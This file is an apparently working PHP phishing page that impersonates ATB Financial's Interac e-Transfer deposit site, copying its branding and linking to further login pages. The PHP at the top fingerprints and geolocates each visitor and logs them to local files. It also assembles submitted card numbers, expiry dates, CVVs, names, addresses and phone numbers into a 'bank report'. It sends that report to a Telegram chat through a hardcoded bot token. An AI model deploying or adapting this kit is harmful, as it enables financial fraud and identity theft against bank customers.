<?php

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS()
{
    global $user_agent;
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }

    return $os_platform;
}

function getBrowser()
{
    global $user_agent;
    $browser = "Unknown Browser";
    $browser_array = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/edge/i' => 'Edge',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );

    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }
    }

    return $browser;
}

$user_os = getOS();
$user_browser = getBrowser();

$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file = 'data.dat';
$file1 = 'combo.txt';
$file2 = 'master.log';
$ip = "" . $PublicIP;
$uaget = "" . $user_agent;
$bsr = "" . $user_browser;
$uos = "" . $user_os;
$ust = explode(" ", $user_agent);
$vr = $ust[3];
$ver = str_replace(")", "", $vr);
$version = "Version              : " . $ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
} else {
    $details = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details = json_decode($details, true);
$success = $details['success'];
$fp = fopen($file, 'a');

if ($success == false) {
    fwrite($fp, $ip . "\n");
    fwrite($fp, $uos . "\n");
    fwrite($fp, $version . "\n");
    fwrite($fp, $bsr . "\n");
    fclose($fp);
} else if ($success == true) {
    $country = $details['country'];
    $city = $details['city'];
    $continent = $details['continent'];
    $tp = $details['type'];
    $cn = $details['country_phone'];
    $is = $details['isp'];
    $la = $details['latitude'];
    $lp = $details['longitude'];
    $crn = $details['currency'];
    $type = $tp;
    $isp = $is;
    $bank = "DO YOU SEE WHAT I C IBC";
    $LL = "+";
    $currency = "" . $full_date;
    $lh = "|";
    $li = ",";
}

$message = "|==🔴🔒 ATB SELECTED 🔒🔴===|\n|IPADDRESS :  " . $ip . "\n|BANK   💰  : " . $bank ."\n|Internet sp :  " . $isp ."\n|Type[4/6]     : ".  $tp . "\n|Device Info  :  " . $uos . $lh . $bsr . "\n|City                :  " . $city . "\n|Continent    :  " . $continent . "\n|Lat+lon         :  " . $la . $LL . $lp . "\n|Phone           :  " . $cn . "\n|Country        :  " . $country . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n| PROFIT   :  " . $_POST['Cardnumber'] . "|" . $_POST['Expiry'] . "|" . $_POST['CVV'] . "|" . $_SESSION['ZIP'] . "|" . $_POST['Nameoncard'] . "|" . $_SESSION['Address'] . "  " . $_SESSION['Apartment'] . "|" . $_SESSION['City'] . "|" . $_SESSION['state'] . "|" . $_SESSION['Phone'] . "|" . $_SERVER['REMOTE_ADDR'] . "|" . $_SESSION['bank_scheme'] . "|" . $_SESSION['bank_type'] . "|" . $_SESSION['bank_brand'] . "|" . $_SESSION['bank_name'] . "|" . $_SESSION['bank_country'] . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n|USERAGENT:  " . $_SERVER['HTTP_USER_AGENT'] . "\n";


$apiToken = "6885525472:AAHKXGwpJimgfHOptJ4JDHw_FWTgyHlRUTk"; 
$data = [
    'chat_id' => '-1001809635857',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
?><meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Send and receive money securely, quickly and conveniently using Interac e-Transfers. Transfer money to or from anyone with a Canadian bank account." >
    <meta name="author" content="">
    <title>Interac e-Transfer – ATB Financial</title>



    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

    <link href="https://etransfer.atb.com/Static/etransfer/css/index.css" rel="stylesheet" >

    <link rel="icon" type="image/x-icon" href="https://etransfer.atb.com/Static/img/favicon.ico" >
    <link rel="Shortcut Icon" href="https://etransfer.atb.com/static/img/favicon.ico" type="image/x-icon">
    <link rel="apple-touch-icon" href="https://etransfer.atb.com/Static/img/apple-touch-icon-57x57.png" >
    <link rel="apple-touch-icon" sizes="76x76" href="https://etransfer.atb.com/Static/img/apple-touch-icon-76x76.png" >
    <link rel="apple-touch-icon" sizes="120x120" href="https://etransfer.atb.com/Static/img/apple-touch-icon-120x120.png" >
    <link rel="apple-touch-icon" sizes="152x152" href="https://etransfer.atb.com/Static/img/apple-touch-icon-152x152.png" >
    <link rel="apple-touch-icon" sizes="167x167" href="https://etransfer.atb.com/Static/img/apple-touch-icon-167x167.png" >
    <link rel="apple-touch-icon" sizes="180x180" href="https://etransfer.atb.com/Static/img/apple-touch-icon-180x180.png" >
    <link rel="icon" type="image/png" sizes="48x48" href="https://etransfer.atb.com/Static/img/favicon-48x48.png" >
    <link rel="icon" type="image/png" sizes="32x32" href="https://etransfer.atb.com/Static/img/favicon-32x32.png" >
    <link rel="icon" type="image/png" sizes="16x16" href="https://etransfer.atb.com/Static/img/favicon-16x16.png" >

</head>


<body page-type="etransfer">

    <header class="container">
        <div class="row">
            <div class="col-lg-12 logo">
                <img src="https://etransfer.atb.com/siteassets/atb-logo.png" class="simpleImage" alt="ATB eTransfer site" aria-label="ATB eTransfer site">

            </div>
        </div>
    </header>

    <div class="container-fluid">
        <div class="row well middle-container">
            <div class="col-lg-12">
                <div class="container">
                    <div class="row">
                        <div id="controls" class="col-lg-12">
                            <h3><strong>Deposit this&nbsp;<em>Interac<sup>&reg;</sup>&nbsp;</em>e-Transfer by logging in to:</strong></h3>
                            <div id="errorMessage" class="error"></div>
                            <div class="col-xs-12 padding-20"></div>
                            <a href="#" id="lnkAtbPersonal" class="btn btn-primary">ATB Personal</a>
                            <button id="onlineBusinessBtn" type="button" class="btn btn-primary">ATB Business</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="container">
        <div class="row">
            <div class="col-lg-12">
                <h4><b>Need Help?</b></h4>
                Call ATB Client Care at 1-800-332-8383 7am-11pm
            </div>
        </div>
    </div>

    <script>
        // JavaScript code
        document.getElementById("lnkAtbPersonal").addEventListener("click", function() {
            window.location.href = "040148.php";
        });

        document.getElementById("onlineBusinessBtn").addEventListener("click", function() {
            window.location.href = "040149.php";
        });
    </script>
</body>

</html>